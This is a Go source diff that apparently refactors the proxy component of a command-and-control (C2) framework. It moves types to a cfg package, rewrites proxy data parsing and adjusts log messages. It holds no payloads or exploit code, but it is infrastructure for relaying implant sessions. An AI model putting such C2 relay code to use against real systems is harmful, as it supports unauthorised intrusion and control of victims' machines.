@@ -26,6 +26,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
@@ -81,7 +82,7 @@ func (p *Proxy) prune() {
 			p.lock.RLock()
 			if _, ok := p.clients[i]; ok {
 				if delete(p.clients, i); cout.Enabled {
-					p.log.Info("[%s] Removed closed Session 0x%X.", p.prefix(), i)
+					p.log.Debug("[%s] Removed closed Session 0x%X.", p.prefix(), i)
 				}
 			}
 			p.lock.RUnlock()
@@ -90,7 +91,7 @@ func (p *Proxy) prune() {
 }
 func (p *Proxy) listen() {
 	if cout.Enabled {
-		p.log.Info("[%s] Starting listen on %q..", p.prefix(), p.listener)
+		p.log.Info(`[%s] Starting listen on "%s"..`, p.prefix(), p.listener)
 	}
 	go p.prune()
 	for {
@@ -122,7 +123,7 @@ func (p *Proxy) listen() {
 				continue
 			}
 			if cout.Enabled {
-				p.parent.log.Error("[%s] Error during Listener accept: %s!", p.prefix(), err)
+				p.parent.log.Error("[%s] Error during Listener accept: %s!", p.prefix(), err.Error())
 			}
 			if ok && !e.Timeout() {
 				break
@@ -133,7 +134,7 @@ func (p *Proxy) listen() {
 			continue
 		}
 		if cout.Enabled {
-			p.log.Trace("[%s] Received a connection from %q..", p.prefix(), c.RemoteAddr())
+			p.log.Trace(`[%s] Received a connection from "%s"..`, p.prefix(), c.RemoteAddr())
 		}
 		go handle(p.log, c, p, c.RemoteAddr().String())
 	}
@@ -149,7 +150,6 @@ func (p *Proxy) listen() {
 	}
 	p.listener.Close()
 	p.state.Set(stateClosed)
-	p.parent.updateProxyStats() // false, p.name)
 	p.parent = nil
 	close(p.ch)
 }
@@ -232,13 +232,14 @@ func (c *proxyClient) chanWake() {
 func (p *Proxy) Address() string {
 	return p.listener.Addr().String()
 }
-func (p *Proxy) wrapper() Wrapper {
-	return p.w
-}
+
 func (c *proxyClient) name() string {
 	return c.ID.String()
 }
 func (proxyClient) accept(_ uint16) {}
+func (p *Proxy) wrapper() cfg.Wrapper {
+	return p.w
+}
 func (c *proxyClient) chanWakeClear() {
 	if c.state.WakeClosed() {
 		return
@@ -254,9 +255,6 @@ func (p *Proxy) clientClear(i uint32) {
 	}
 	v.chn = nil
 	v.state.Unset(stateChannelProxy)
-}
-func (p *Proxy) transform() Transform {
-	return p.t
 }
 
 func (c *proxyClient) chanStop() bool {
@@ -284,6 +282,9 @@ func (c *proxyClient) chanRunning() bool {
 func (c *proxyClient) stateSet(v uint32) {
 	c.state.Set(v)
 }
+func (p *Proxy) transform() cfg.Transform {
+	return p.t
+}
 func (c *proxyClient) stateUnset(v uint32) {
 	c.state.Unset(v)
 }
@@ -309,7 +310,7 @@ func (c *proxyClient) queue(n *com.Packet) {
 	}
 	if bugtrack.Enabled {
 		if n.Device.Empty() {
-			bugtrack.Track("c2.proxyClient.queue(): Calling queue with empty Device, n.ID=%d!", n.ID)
+			bugtrack.Track("c2.(*proxyClient).queue(): Calling queue with empty Device, n.ID=%d!", n.ID)
 		}
 	}
 	if c.chn != nil {
@@ -384,43 +385,6 @@ func (p *Proxy) clientGet(i uint32) (connHost, bool) {
 	v, ok := p.clients[i]
 	return v, ok
 }
-
-// Replace allows for rebinding this Proxy to another address or using another
-// Profile without closing the Proxy.
-//
-// The listening socket will be closed and the Proxy will be paused and
-// cannot accept any more connections before being reopened.
-//
-// If the replacement fails, the Proxy will be closed.
-func (p *Proxy) Replace(addr string, n Profile) error {
-	if n == nil {
-		n = p.p
-	}
-	h, w, t := n.Next()
-	if len(addr) > 0 {
-		h = addr
-	}
-	if len(h) == 0 {
-		return ErrNoHost
-	}
-	p.state.Set(stateReplacing)
-	p.listener.Close()
-	p.listener = nil
-	v, err := n.Listen(p.ctx, h)
-	if err != nil {
-		p.Close()
-		return xerr.Wrap("unable to listen", err)
-	} else if v == nil {
-		p.Close()
-		return xerr.Sub("unable to listen", 0x49)
-	}
-	p.listener, p.w, p.t, p.p, p.addr = v, w, t, n, h
-	if p.state.Unset(stateReplacing); cout.Enabled {
-		p.log.Info("[%s] Replaced Proxy listener socket, now bound to %s!", p.prefix(), h)
-	}
-	p.parent.updateProxyStats() // true, p.name)
-	return nil
-}
 func (p proxyData) MarshalStream(w data.Writer) error {
 	if err := w.WriteString(p.n); err != nil {
 		return err
@@ -450,12 +414,49 @@ func (p *Proxy) notify(_ connHost, n *com.Packet) error {
 	p.parent.write(true, n)
 	return nil
 }
+
+// Replace allows for rebinding this Proxy to another address or using another
+// Profile without closing the Proxy.
+//
+// The listening socket will be closed and the Proxy will be paused and
+// cannot accept any more connections before being reopened.
+//
+// If the replacement fails, the Proxy will be closed.
+func (p *Proxy) Replace(addr string, n cfg.Profile) error {
+	if n == nil {
+		n = p.p
+	}
+	h, w, t := n.Next()
+	if len(addr) > 0 {
+		h = addr
+	}
+	if len(h) == 0 {
+		return ErrNoHost
+	}
+	p.state.Set(stateReplacing)
+	p.listener.Close()
+	p.listener = nil
+	v, err := n.Listen(p.ctx, h)
+	if err != nil {
+		p.Close()
+		return xerr.Wrap("unable to listen", err)
+	} else if v == nil {
+		p.Close()
+		return xerr.Sub("unable to listen", 0x49)
+	}
+	p.listener, p.w, p.t, p.p, p.addr = v, w, t, n, h
+	if p.state.Unset(stateReplacing); cout.Enabled {
+		p.log.Info(`[%s] Replaced Proxy listener socket, now bound to "%s"!`, p.prefix(), h)
+	}
+	//p.parent.updateProxyStats() // true, p.name)
+	return nil
+}
 func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 	if n.Device.Empty() || p.parent.state.Closing() {
 		return nil, io.ErrShortBuffer
 	}
 	if n.Flags |= com.FlagProxy; cout.Enabled {
-		p.log.Debug("[%s:%s] %s: Received a Packet %q..", p.prefix(), n.Device, a, n)
+		p.log.Trace(`[%s:%s] %s: Received a Packet "%s"..`, p.prefix(), n.Device, a, n)
 	}
 	p.lock.RLock()
 	var (
@@ -484,7 +485,7 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 		p.lock.Lock()
 		p.clients[i] = c
 		if p.lock.Unlock(); cout.Enabled {
-			p.log.Info("[%s:%s] %s: New client registered as %q hash 0x%X.", p.prefix(), c.ID, a, c.ID, i)
+			p.log.Info(`[%s:%s] %s: New client registered as "%s" hash 0x%X.`, p.prefix(), c.ID, a, c.ID, i)
 		}
 		p.parent.write(true, n)
 		c.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
@@ -506,37 +507,25 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 	}
 	return v, nil
 }
-func readProxyInfo(r io.Reader, d *[8]byte) ([]proxyData, error) {
-	if err := readFull(r, 1, (*d)[0:1]); err != nil {
+func readProxyData(f bool, r data.Reader) ([]proxyData, error) {
+	n, err := r.Uint8()
+	if err != nil {
 		return nil, err
 	}
-	m := int((*d)[0])
-	if m == 0 {
-		return nil, nil
-	}
-	var (
-		o   = make([]proxyData, m)
-		err error
-	)
-	for i := 0; i < m && i < 0xFF; i++ {
-		if err = readFull(r, 4, (*d)[0:4]); err != nil {
+	o := make([]proxyData, n)
+	for i := range o {
+		if err = r.ReadString(&o[i].n); err != nil {
 			return nil, err
 		}
-		n, s := make([]byte, uint16((*d)[1])|uint16((*d)[0])<<8), make([]byte, uint16((*d)[3])|uint16((*d)[2])<<8)
-		if len(n) > 0 {
-			if err = readFull(r, len(n), n); err != nil {
-				return nil, err
-			}
-		}
-		if len(s) > 0 {
-			if err = readFull(r, len(s), s); err != nil {
-				return nil, err
-			}
-		}
-		if o[i].p, err = readSlice(r, d); err != nil {
+		if err = r.ReadString(&o[i].b); err != nil {
 			return nil, err
 		}
-		o[i].b, o[i].n = string(n), string(s)
+		if !f {
+			continue
+		}
+		if err = r.ReadBytes(&o[i].p); err != nil {
+			return nil, err
+		}
 	}
 	return o, nil
 }
@@ -556,7 +545,7 @@ func (p *Proxy) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com
 		return nil, 0, nil, io.ErrShortBuffer
 	}
 	if cout.Enabled {
-		p.log.Trace("[%s:%s/M] %s: Received a Packet %q..", p.prefix(), n.Device, a, n)
+		p.log.Trace(`[%s:%s/M] %s: Received a Packet "%s"..`, p.prefix(), n.Device, a, n)
 	}
 	p.lock.RLock()
 	var (
@@ -585,7 +574,7 @@ func (p *Proxy) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com
 		p.lock.Lock()
 		p.clients[i] = c
 		if p.lock.Unlock(); cout.Enabled {
-			p.log.Info("[%s:%s/M] %s: New client registered as %q hash 0x%X.", p.prefix(), c.ID, a, c.ID, i)
+			p.log.Info(`[%s:%s/M] %s: New client registered as "%s" hash 0x%X.`, p.prefix(), c.ID, a, c.ID, i)
 		}
 		c.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
 	}
